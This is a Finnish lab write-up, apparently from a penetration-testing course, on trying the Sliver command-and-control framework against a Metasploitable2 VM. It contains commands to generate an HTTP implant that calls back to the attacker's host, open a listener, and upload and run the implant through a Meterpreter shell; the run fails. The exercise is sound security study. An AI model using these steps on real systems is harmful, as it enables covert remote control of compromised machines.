...
![python_shell](/imagesh3/python_tty.JPG)
...
## o) Vapaaehtoinen, vaikea: Kokeile jotain kilpailevaa hyökkäystyökalua tai vihamielistä etäkäyttötyökalua, kuten Sliver tai Scarecrow. (Tehty 9.9.26)

### Mikä ihmeen sliver? 
[BishopFox, sliver githup](https://github.com/BishopFox/sliver)

Sliver on C2 työkalu, eli homman nimi on command and control. Tämä on siis hyväksikäytön jälkeisessä vaiheessa käytettävä työkalu, jolla hallitaan kohdekoneita etäältä.

[Sliver C2, Tutorials: Getting Started](https://sliver.sh/tutorials/?name=1+-+Getting+Started)(https://sliver.sh/tutorials/?name=1+-+Getting+Started)

### Ladataan sliver
Minulla on jo sliver ladattuna viime keväältä, mutta tässä kertauksena miten se tehdään.

[Kali.org; Kali Linux Tools, sliver](https://www.kali.org/tools/sliver/)

```
sudo apt install sliver
```
![install sliver](/imagesh3/install_sliver.JPG)

### Käynnistetään sliver
[Sliver C2, Tutorials: Getting Started](https://sliver.sh/tutorials/?name=1+-+Getting+Started)(https://sliver.sh/tutorials/?name=1+-+Getting+Started)

Ajan sliver serveriä sudona, koska haluan avata http-kuunteluportin ja tehdä payload binäärin tunkeutumistestausta varten luomaani hakemistoon.
Käytän ajaakseni sudona komentoa:
```
sudo sliver-server
```

![start sliver](/imagesh3/start_sliver.JPG)

### Luodaan payload
Haluan payload binäärin, joka http:llä yhteyden sliver serveriin sekä vastaa kohdekoneen arkkitehtuuria ja haluan tallentaa sen PenTest hakemistoon:
```
generate --http 192.168.56.101:9000 -o linux --save home/PenTest/MetaPayload
```
> [!NOTE]
> Sliver tekee oletuksena binäärin, joten tutoriaalin -b vipu on tarpeeton.

Tässä meni ainakin omalla koneellani noin 15min, kun sliver rakensi binääriä.

![gen payload](/imagesh3/gen_payload.JPG)

### Avataan kuuntelija paikallisella koneella
Seuraavaksi tutoriaalissa neuvottiin avaamaan kuunteluportti `http`-komennolla, tämä kuitenkin avaisi http oletusportissa kuuntelijan. Tämä voi olla omavalintainen vapaa portti, joten valitsin portin 9000.
Sliver kertoo komentojensa manuaalin `-h` vipua käyttäen. Katsoin siis manuaalista tukea tähän seuraavaan komentoon, jolla avaan portissa 9000 kuuntelijan:

```
http -l 9000
```

![listener](/imagesh3/listener_9000.JPG)

### Siirretään payload kohdekoneelle ja ajetaan siellä binääri
Nyt Sliverin payload pitää siirtää kohdekoneelle ja tätä me voidaan tehdä **meterpreter** istunnossa, joka meillä on auki aiemmista tehtävistä.
```
upload /home/kali/PenTest/MetaPayload /tmp/
```
- `upload` Lataa kohdekoneelle
- `/home/kali/PenTest/MetaPayload` Payloadin polku
- `/tmp/` Kohde hakemisto

![upload payload](/imagesh3/upload_payload.JPG)

#### Seuraavaksi ajetaan binääri kohdekoneella

Meterpreter on kömpelö suorittamaan binääreitä suoraan, joten avaan sillä shellin: `shell`. Seuraavaksi yritin suorittaa binäärin komennolla: `./MetaPayload`. Sain virheen: `/bin/sh: line 2: ./MetaPayload: cannot execute binary file`. 


Tämä sai minut miettimään, onko binääri oikeasti metasploitablen arkkitehtuurille sopiva? Tarkistin `file ./MetaPayload`-komennolla tiedoston tarkempia tietoja ja sain:
```
./MetaPayload: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, stripped
```
![payload_shell](/imagesh3/payload_shell.JPG)

Tämä paljasti, että binääri on 64-bit arkkitehtuurille sopiva. Aiemmasta tehtävästi tiedän, että Metasploitable2 on 32-bit arkkitehtuuria.
Teen nopeasti uuden binäärin, mutta nyt annan sille myös uuden lipun `-a 386`. Tämän pitäisi antaa sille oikea CPU arkkitehtuuri.

![new payload](/imagesh3/new_payload.JPG)


#### Ajetaan uusi binääri kohdekoneella

![exec payload2](/imagesh3/exec_payload2.JPG)

### Tämäkään payload ei lähde suoriutumaan.
En keksi ratkaisua tähän ongelmaan. Ehkä Metasploitable2 on jotenkin yhteensopimaton sliver implanttien kanssa?
...
- Jaswal 2020: Mastering Metasploit - 4ed: Chapter 1: Approaching a Penetration Test Using Metasploit
  (https://learning.oreilly.com/library/view/mastering-metasploit/9781838980078/B15076_01_Final_ASB_ePub.xhtml#_idParaDest-31)(Luettu 9.4.2026)
- nmap manual, host discovery
  (https://nmap.org/book/man-host-discovery.html) (Luettu 5.4.2026)
- Gordon "Fyodor" Lyon, Nmap Network Scanning: The Official Nmap Project Guide to Network Discovery and Security Scanning, Chapter 3. Host Discovery (“Ping Scanning”): Disable Port Scan (-sn)
  (https://nmap.org/book/host-discovery-controls.html#host-discovery-sn) (Luettu 9.4.2026)
- CVEdetails.com, Updated 2021: Vulnerability Details : CVE-2011-2523
  (https://www.cvedetails.com/cve/CVE-2011-2523/) (Luettu 12.4.26)
- OffSec: metasploit unleashed: Databases
  (https://www.offsec.com/metasploit-unleashed/database-introduction/)(Luettu 12.4.26)
- Options Summary, OUTPUT
  (https://nmap.org/book/man-briefoptions.html)(Luettu 12.4.26)
- Erick Sanga 2025:EXPLOITING METASPLOITABLE 2
  (https://hackmd.io/@ericksanga/metasploitable2)(Luettu 12.4.26)
- MITRE ATT&CK; taktiikka ja tekniikka matriisi
  (https://attack.mitre.org/)(https://attack.mitre.org/) (Luettu 8.9.26)
- Zacheller.dev; pentest, priviliege escalation 24.12.2020
  (https://wiki.zacheller.dev/pentest/privilege-escalation/spawning-a-tty-shell) (Luettu 8.9.26)
- ServerFault.com forum Oct 24, 2022; Error opening terminal: unknown when executing nano
  (https://serverfault.com/questions/1113858/error-opening-terminal-unknown-when-executing-nano) (Luettu 8.9.26)
- BishopFox, sliver github
  https://github.com/BishopFox/sliver (Luettu 9.9.26)
- Kali.org; Kali Linux Tools, sliver
  (https://www.kali.org/tools/sliver/) (Luettu 9.9.26)
- Sliver C2, Tutorials: Getting Started
  (https://sliver.sh/tutorials/?name=1+-+Getting+Started) (Luettu 9.9.26)
